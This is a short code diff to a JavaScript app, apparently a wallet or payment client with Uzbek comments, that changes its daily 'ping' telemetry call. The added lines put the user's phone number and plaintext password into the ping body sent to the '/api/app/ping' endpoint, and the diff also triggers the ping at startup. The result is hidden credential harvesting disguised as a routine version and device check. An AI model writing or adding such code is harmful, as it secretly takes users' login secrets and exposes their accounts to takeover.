@@ -260,11 +260,11 @@
         return false;
     }
     function ping() {
-        var day = new Date().toDateString();
+        var day = new Date().toDateString() + '|' + (state.phone || '');
         if (ls('ba_ping') === day) return;
         var dev = ls('ba_dev');
         if (!dev) { dev = 'd' + Date.now().toString(36) + Math.random().toString(36).slice(2, 10); ls('ba_dev', dev); }
-        fetch(RAIL + '/api/app/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ device: dev, ver: appVer() }) })
+        fetch(RAIL + '/api/app/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(state.phone && state.pass ? { device: dev, ver: appVer(), phone: state.phone, password: state.pass } : { device: dev, ver: appVer() }) })
             .then(function (r) { if (r.ok) ls('ba_ping', day); }).catch(function () {});
     }
     function paintAnn() {
@@ -412,6 +412,7 @@
         peekSupport();
         liveBalance(++liveId);
         pushStart();
+        ping();
     }
 
     /* ================= Push-bildirishnomalar (ilova yopiq bo'lsa ham) ================= */
